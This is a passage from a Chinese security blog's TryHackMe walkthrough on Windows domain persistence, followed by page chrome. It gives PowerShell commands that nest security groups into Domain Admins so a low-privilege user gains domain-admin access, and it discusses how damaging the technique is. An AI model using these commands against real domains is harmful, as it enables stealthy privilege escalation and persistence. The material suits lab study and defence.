+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\Administrator.ZA&gt; New-ADGroup -Path &quot;OU=CONSULTING,OU=PEOPLE,DC=ZA,DC=TRYHACKME,DC=LOC&quot; -Name &quot;&lt;username&gt; Net Group 3&quot; -SamAccountName &quot;&lt;username&gt;_nestgroup3&quot; -DisplayName &quot;&lt;username&gt; Nest Group 3&quot; -GroupScope Global -GroupCategory Security</span><br><span class="line">PS C:\Users\Administrator.ZA&gt; Add-ADGroupMember -Identity &quot;&lt;username&gt;_nestgroup3&quot; -Members &quot;&lt;username&gt;_nestgroup2&quot;</span><br><span class="line">PS C:\Users\Administrator.ZA&gt; New-ADGroup -Path &quot;OU=MARKETING,OU=PEOPLE,DC=ZA,DC=TRYHACKME,DC=LOC&quot; -Name &quot;&lt;username&gt; Net Group 4&quot; -SamAccountName &quot;&lt;username&gt;_nestgroup4&quot; -DisplayName &quot;&lt;username&gt; Nest Group 4&quot; -GroupScope Global -GroupCategory Security</span><br><span class="line">PS C:\Users\Administrator.ZA&gt; Add-ADGroupMember -Identity &quot;&lt;username&gt;_nestgroup4&quot; -Members &quot;&lt;username&gt;_nestgroup3&quot;</span><br><span class="line">PS C:\Users\Administrator.ZA&gt; New-ADGroup -Path &quot;OU=IT,OU=PEOPLE,DC=ZA,DC=TRYHACKME,DC=LOC&quot; -Name &quot;&lt;username&gt; Net Group 5&quot; -SamAccountName &quot;&lt;username&gt;_nestgroup5&quot; -DisplayName &quot;&lt;username&gt; Nest Group 5&quot; -GroupScope Global -GroupCategory Security</span><br><span class="line">PS C:\Users\Administrator.ZA&gt; Add-ADGroupMember -Identity &quot;&lt;username&gt;_nestgroup5&quot; -Members &quot;&lt;username&gt;_nestgroup4&quot;</span><br></pre></td></tr></table></figure>
+<p>对于最后一个组，现在让我们将该组添加到域管理员组：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\Administrator.ZA&gt;Add-ADGroupMember -Identity &quot;Domain Admins&quot; -Members &quot;&lt;username&gt;_nestgroup5&quot;</span><br></pre></td></tr></table></figure>
+<p>最后，让我们将低特权 AD 用户添加到我们创建的第一个组中：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\Administrator.ZA&gt;Add-ADGroupMember -Identity &quot;&lt;username&gt;_nestgroup1&quot; -Members &quot;&lt;low privileged username&gt;&quot;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>最后生成的嵌套组的样子</p>
+<p>IT——&gt;OU</p>
+<p>​    第五组—————(IT组)</p>
+<p>​        第四组</p>
+<p>​            第三组</p>
+<p>​                第二组</p>
+<p>​                    第一组————(IT组)</p>
+<p>就是这样的嵌套模式   其他组是啥就无所谓了</p>
+</blockquote>
+<p>然后我们ssh—-登录低权限用户</p>
+<p>执行<code>dir \\thmdc.za.tryhackme.loc\c$\</code> </p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20230925113415104.png" alt="image-20230925113415104"></p>
+<p>我们还要验证一下，即使我们创建了多个组，域管理员组也只有一个新成员：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20230925113530594.png" alt="image-20230925113530594"></p>
+<h3 id="危害性"><a href="#危害性" class="headerlink" title="危害性"></a>危害性</h3><p>如果这是一个真正的组织，我们就不会创建新的团体来嵌套。相反，我们将利用现有组来执行嵌套。然而，这是你在正常的红队评估中永远不会做的事情，而且几乎总是在这一点上脱链，因为它破坏了组织的AD结构，如果我们充分打破它，他们将无法恢复。在这一点上，即使蓝队能够把我们踢出去，该组织很可能仍然必须从头开始重建他们的整个AD结构，从而导致重大损失。</p>
+<p><strong>就是证书伪造一样  危害性比较大  在正常的红队评估里面是不太会用到的  因为可能回导致整个域的重组</strong>  </p>
+<h2 id="通过-ACL-实现持久性"><a href="#通过-ACL-实现持久性" class="headerlink" title="通过 ACL 实现持久性"></a>通过 ACL 实现持久性</h2></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://ke1nys.github.io">ke1nys</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://ke1nys.github.io/posts/a3cbb047.html">https://ke1nys.github.io/posts/a3cbb047.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://ke1nys.github.io" target="_blank">ke1nys`Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%86%85%E7%BD%91/">内网</a></div><div class="post_share"><div class="social-share" data-image="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/posts/29edf1b0.html"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://fastly.jsdelivr.net/gh/jerryc127/CDN@latest/cover/default_bg.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">VulnStack1</div></div></a></div><div class="next-post pull-right"><a href="/posts/4c70f180.html"><img class="next-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://fastly.jsdelivr.net/gh/jerryc127/CDN@latest/cover/default_bg.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Windows-NTLM与PTH</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/posts/9fa2b7fe.html" title="AD域-预身份验证"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-09-14</div><div class="title">AD域-预身份验证</div></div></a></div><div><a href="/posts/29edf1b0.html" title="VulnStack1"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://fastly.jsdelivr.net/gh/jerryc127/CDN@latest/cover/default_bg.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-09-19</div><div class="title">VulnStack1</div></div></a></div><div><a href="/posts/1bedf17b.html" title="Windows域-Kerberos协议"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://fastly.jsdelivr.net/gh/jerryc127/CDN@latest/cover/default_bg.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-09-15</div><div class="title">Windows域-Kerberos协议</div></div></a></div><div><a href="/posts/4c70f180.html" title="Windows-NTLM与PTH"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://fastly.jsdelivr.net/gh/jerryc127/CDN@latest/cover/default_bg.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-09-16</div><div class="title">Windows-NTLM与PTH</div></div></a></div><div><a href="/posts/a5488d48.html" title="端口转发和流量代理"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://fastly.jsdelivr.net/gh/jerryc127/CDN@latest/cover/default_bg.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-09-14</div><div class="title">端口转发和流量代理</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/qq.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">ke1nys</div><div class="author-info__description">生命不息,折腾不止</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">131</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">121</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/ke1nys/ke1nys.github.io"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">欢迎来到我的博客一起学习嗷~</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#DC-Sync"><span class="toc-number">1.</span> <span class="toc-text">DC Sync</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.1.</span> <span class="toc-text">介绍</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-%E5%AF%BC%E5%87%BAhash"><span class="toc-number">1.2.</span> <span class="toc-text">利用(导出hash)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%B4%E6%8C%81-%E7%BB%99%E5%88%AB%E7%9A%84%E8%AE%A1%E7%AE%97%E6%9C%BA%E6%B7%BB%E5%8A%A0%E7%AE%A1%E7%90%86%E5%91%98%E6%9D%83%E9%99%90"><span class="toc-number">1.3.</span> <span class="toc-text">维持(给别的计算机添加管理员权限)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%92%8C%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE"><span class="toc-number">2.</span> <span class="toc-text">黄金票据和白银票据</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE"><span class="toc-number">2.1.</span> <span class="toc-text">黄金票据</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E7%89%B9%E7%82%B9"><span class="toc-number">2.1.1.</span> <span class="toc-text">黄金票据特点</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%B6%E4%BD%9C%E6%9D%A1%E4%BB%B6"><span class="toc-number">2.1.2.</span> <span class="toc-text">制作条件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%B6%E4%BD%9C%E6%AD%A5%E9%AA%A4"><span class="toc-number">2.1.3.</span> <span class="toc-text">制作步骤</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E5%AF%BC%E5%87%BAkrbtgt%E7%9A%84Hash"><span class="toc-number">2.1.3.1.</span> <span class="toc-text">1.导出krbtgt的Hash</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E7%94%9F%E6%88%90Golden-Ticket"><span class="toc-number">2.1.3.2.</span> <span class="toc-text">2.生成Golden Ticket</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-%E5%AF%BC%E5%85%A5%E4%BC%AA%E9%80%A0Golden-Ticket%E8%8E%B7%E5%BE%97%E5%9F%9F%E6%8E%A7%E6%9D%83%E9%99%90"><span class="toc-number">2.1.3.3.</span> <span class="toc-text">3. 导入伪造Golden Ticket获得域控权限</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%B3%A8%E6%84%8F"><span class="toc-number">2.1.3.4.</span> <span class="toc-text">注意</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE"><span class="toc-number">2.2.</span> <span class="toc-text">白银票据</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE%E7%89%B9%E7%82%B9"><span class="toc-number">2.2.1.</span> <span class="toc-text">白银票据特点</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%B6%E4%BD%9C%E6%9D%A1%E4%BB%B6-1"><span class="toc-number">2.2.2.</span> <span class="toc-text">制作条件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE%E7%9A%84%E6%9C%8D%E5%8A%A1%E5%88%97%E8%A1%A8"><span class="toc-number">2.2.3.</span> <span class="toc-text">白银票据的服务列表</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%B6%E4%BD%9C%E6%AD%A5%E9%AA%A4-1"><span class="toc-number">2.2.4.</span> <span class="toc-text">制作步骤</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E8%8E%B7%E5%8F%96hash-sid%E7%AD%89%E4%BF%A1%E6%81%AF"><span class="toc-number">2.2.4.1.</span> <span class="toc-text">1.获取hash sid等信息</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E4%BC%AA%E9%80%A0%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE"><span class="toc-number">2.2.4.2.</span> <span class="toc-text">2.伪造白银票据</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%90%84%E7%A7%8D%E6%9C%8D%E5%8A%A1%E4%B8%AD%E7%9A%84%E7%A4%BA%E4%BE%8B"><span class="toc-number">2.2.5.</span> <span class="toc-text">各种服务中的示例</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%92%8C%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-number">2.3.</span> <span class="toc-text">黄金票据和白银票据的区别</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E8%AE%BF%E9%97%AE%E6%9D%83%E9%99%90%E4%B8%8D%E5%90%8C"><span class="toc-number">2.3.0.1.</span> <span class="toc-text">1.访问权限不同</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-%E8%AE%A4%E8%AF%81%E6%B5%81%E7%A8%8B%E4%B8%8D%E5%90%8C"><span class="toc-number">2.3.0.2.</span> <span class="toc-text">3.认证流程不同</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%9A%E8%BF%87%E8%AF%81%E4%B9%A6%E5%AE%9E%E7%8E%B0%E6%8C%81%E4%B9%85%E6%80%A7"><span class="toc-number">3.</span> <span class="toc-text">通过证书实现持久性</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E8%AF%81%E4%B9%A6"><span class="toc-number">3.1.</span> <span class="toc-text">什么是证书</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8F%90%E5%8F%96%E7%A7%81%E9%92%A5"><span class="toc-number">3.2.</span> <span class="toc-text">提取私钥</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E6%88%91%E4%BB%AC%E5%85%88%E6%9D%A5%E7%9C%8B%E7%9C%8B%E6%98%AF%E5%90%A6%E5%8F%AF%E4%BB%A5%E6%9F%A5%E7%9C%8B%E5%AD%98%E5%82%A8%E5%9C%A8-DC-%E4%B8%8A%E7%9A%84%E8%AF%81%E4%B9%A6%EF%BC%9A"><span class="toc-number">3.2.1.</span> <span class="toc-text">1.我们先来看看是否可以查看存储在 DC 上的证书：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%9F%E6%88%90%E6%88%91%E4%BB%AC%E8%87%AA%E5%B7%B1%E7%9A%84%E8%AF%81%E4%B9%A6"><span class="toc-number">3.3.</span> <span class="toc-text">生成我们自己的证书</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%AA%8C%E8%AF%81%E8%AF%81%E4%B9%A6%E6%98%AF%E5%90%A6%E4%BC%AA%E9%80%A0%E6%88%90%E5%8A%9F"><span class="toc-number">3.4.</span> <span class="toc-text">验证证书是否伪造成功</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%AA%8C%E8%AF%81TGT%E6%98%AF%E5%90%A6%E6%9C%89%E6%95%88"><span class="toc-number">3.5.</span> <span class="toc-text">验证TGT是否有效</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%9A%E8%BF%87-SID-%E5%8E%86%E5%8F%B2%E8%AE%B0%E5%BD%95%E4%BF%9D%E6%8C%81"><span class="toc-number">4.</span> <span class="toc-text">通过 SID 历史记录保持</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SID%E4%BD%9C%E7%94%A8"><span class="toc-number">4.1.</span> <span class="toc-text">SID作用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SID-History%E5%88%A9%E7%94%A8"><span class="toc-number">4.2.</span> <span class="toc-text">SID-History利用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%9A%E8%BF%87%E7%BB%84%E6%88%90%E5%91%98%E8%BA%AB%E4%BB%BD%E5%AE%9E%E7%8E%B0%E6%8C%81%E4%B9%85%E6%80%A7"><span class="toc-number">5.</span> <span class="toc-text">通过组成员身份实现持久性</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E8%BF%87%E7%BB%84%E6%88%90%E5%91%98%E8%BA%AB%E4%BB%BD%E5%AE%9E%E7%8E%B0%E6%8C%81%E4%B9%85%E6%80%A7-1"><span class="toc-number">5.1.</span> <span class="toc-text">通过组成员身份实现持久性</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B5%8C%E5%A5%97%E7%BB%84"><span class="toc-number">5.2.</span> <span class="toc-text">嵌套组</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%B5%8C%E5%A5%97%E7%BB%84"><span class="toc-number">5.3.</span> <span class="toc-text">利用嵌套组</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8D%B1%E5%AE%B3%E6%80%A7"><span class="toc-number">5.4.</span> <span class="toc-text">危害性</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%9A%E8%BF%87-ACL-%E5%AE%9E%E7%8E%B0%E6%8C%81%E4%B9%85%E6%80%A7"><span class="toc-number">6.</span> <span class="toc-text">通过 ACL 实现持久性</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/posts/f0050380.html" title="Java-Kryo反序列化"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://fastly.jsdelivr.net/gh/jerryc127/CDN@latest/cover/default_bg.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Java-Kryo反序列化"/></a><div class="content"><a class="title" href="/posts/f0050380.html" title="Java-Kryo反序列化">Java-Kryo反序列化</a><time datetime="2023-09-19T11:48:38.000Z" title="发表于 2023-09-19 19:48:38">2023-09-19</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/29edf1b0.html" title="VulnStack1"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://fastly.jsdelivr.net/gh/jerryc127/CDN@latest/cover/default_bg.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="VulnStack1"/></a><div class="content"><a class="title" href="/posts/29edf1b0.html" title="VulnStack1">VulnStack1</a><time datetime="2023-09-19T00:29:05.000Z" title="发表于 2023-09-19 08:29:05">2023-09-19</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/a3cbb047.html" title="Windows域-权限维持"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Windows域-权限维持"/></a><div class="content"><a class="title" href="/posts/a3cbb047.html" title="Windows域-权限维持">Windows域-权限维持</a><time datetime="2023-09-17T08:24:08.000Z" title="发表于 2023-09-17 16:24:08">2023-09-17</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/4c70f180.html" title="Windows-NTLM与PTH"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://fastly.jsdelivr.net/gh/jerryc127/CDN@latest/cover/default_bg.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Windows-NTLM与PTH"/></a><div class="content"><a class="title" href="/posts/4c70f180.html" title="Windows-NTLM与PTH">Windows-NTLM与PTH</a><time datetime="2023-09-16T11:22:08.000Z" title="发表于 2023-09-16 19:22:08">2023-09-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/1bedf17b.html" title="Windows域-Kerberos协议"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://fastly.jsdelivr.net/gh/jerryc127/CDN@latest/cover/default_bg.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Windows域-Kerberos协议"/></a><div class="content"><a class="title" href="/posts/1bedf17b.html" title="Windows域-Kerberos协议">Windows域-Kerberos协议</a><time datetime="2023-09-15T07:05:59.000Z" title="发表于 2023-09-15 15:05:59">2023-09-15</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2022 - 2023 By ke1nys</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/metingjs/dist/Meting.min.js"></script><div class="app-refresh" id="app-refresh" style="position: fixed;top: -2.2rem;left: 0;right: 0;z-index: 99999;padding: 0 1rem;font-size: 15px;height: 2.2rem;transition: all 0.3s ease;"><div class="app-refresh-wrap" style=" display: flex;color: #fff;height: 100%;align-items: center;justify-content: center;"><label>✨ 有新文章啦！ 👉</label><a href="javascript:void(0)" onclick="location.reload()"><span style="color: #fff;text-decoration: underline;cursor: pointer;">🍗点击食用🍔</span></a></div></div><script>if ('serviceWorker' in navigator) {
+if (navigator.serviceWorker.controller) {
+navigator.serviceWorker.addEventListener('controllerchange', function() {
+showNotification()
+})
+}
+window.addEventListener('load', function() {
+navigator.serviceWorker.register('/sw.js')
+})
+}
+function showNotification() {
+if (GLOBAL_CONFIG.Snackbar) {
+var snackbarBg =
+document.documentElement.getAttribute('data-theme') === 'light' ?
+GLOBAL_CONFIG.Snackbar.bgLight :
+GLOBAL_CONFIG.Snackbar.bgDark
+var snackbarPos = GLOBAL_CONFIG.Snackbar.position
+Snackbar.show({
+text: '✨ 有新文章啦！ 👉',
+backgroundColor: snackbarBg,
+duration: 500000,
+pos: snackbarPos,
+actionText: '🍗点击食用🍔',
+actionTextColor: '#fff',
+onActionClick: function(e) {
+location.reload()
+},
+})
+} else {
+var showBg =
+document.documentElement.getAttribute('data-theme') === 'light' ?
+'#3b70fc' :
+'#1f1f1f'
+var cssText = `top: 0; background: ${showBg};`
+document.getElementById('app-refresh').style.cssText = cssText
+}
+}</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><!-- hexo injector body_end start --><script data-pjax>
+  function butterfly_clock_anzhiyu_injector_config(){
+    var parent_div_git = document.getElementsByClassName('sticky_layout')[0];
+    var item_html = '<div class="card-widget card-clock"><div class="card-glass"><div class="card-background"><div class="card-content"><div id="hexo_electric_clock"><img class="entered loading" id="card-clock-loading" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.cbd.int/hexo-butterfly-clock-anzhiyu/lib/loading.gif" style="height: 120px; width: 100%;" data-ll-status="loading"/></div></div></div></div></div>';
+    console.log('已挂载butterfly_clock_anzhiyu')
+    if(parent_div_git) {
+      parent_div_git.insertAdjacentHTML("afterbegin",item_html)
+    }
+  }
+  var elist = 'null'.split(',');
+  var cpage = location.pathname;
+  var epage = 'all';
+  var qweather_key = 'b16a1fa0e63c46a4b8f28abfb06ae3fe';
+  var gaud_map_key = 'e2b04289e870b005374ee030148d64fd&s=rsv3';
+  var baidu_ak_key = 'undefined';
+  var flag = 0;
+  var clock_rectangle = '112.982279,28.19409';
+  var clock_default_rectangle_enable = 'false';
+
+  for (var i=0;i<elist.length;i++){
+    if (cpage.includes(elist[i])){
+      flag++;
+    }
+  }
+
+  if ((epage ==='all')&&(flag == 0)){
+    butterfly_clock_anzhiyu_injector_config();
+  }
+  else if (epage === cpage){
+    butterfly_clock_anzhiyu_injector_config();
+  }
+  </script><script src="https://widget.qweather.net/simple/static/js/he-simple-common.js?v=2.0"></script><script data-pjax src="https://cdn.cbd.int/hexo-butterfly-clock-anzhiyu/lib/clock.min.js"></script><div class="js-pjax"><script async="async">var arr = document.getElementsByClassName('recent-post-item');
+for(var i = 0;i<arr.length;i++){
+    arr[i].classList.add('wow');
+    arr[i].classList.add('animate__zoomIn');
+    arr[i].setAttribute('data-wow-duration', '1.5s');
+    arr[i].setAttribute('data-wow-delay', '200ms');
+    arr[i].setAttribute('data-wow-offset', '30');
+    arr[i].setAttribute('data-wow-iteration', '1');
+  }</script><script async="async">var arr = document.getElementsByClassName('card-widget');
+for(var i = 0;i<arr.length;i++){
+    arr[i].classList.add('wow');
+    arr[i].classList.add('animate__zoomIn');
+    arr[i].setAttribute('data-wow-duration', '');
+    arr[i].setAttribute('data-wow-delay', '200ms');
+    arr[i].setAttribute('data-wow-offset', '');
+    arr[i].setAttribute('data-wow-iteration', '');
+  }</script><script async="async">var arr = document.getElementsByClassName('flink-list-card');
+for(var i = 0;i<arr.length;i++){
+    arr[i].classList.add('wow');
+    arr[i].classList.add('animate__flipInY');
+    arr[i].setAttribute('data-wow-duration', '3s');
+    arr[i].setAttribute('data-wow-delay', '');
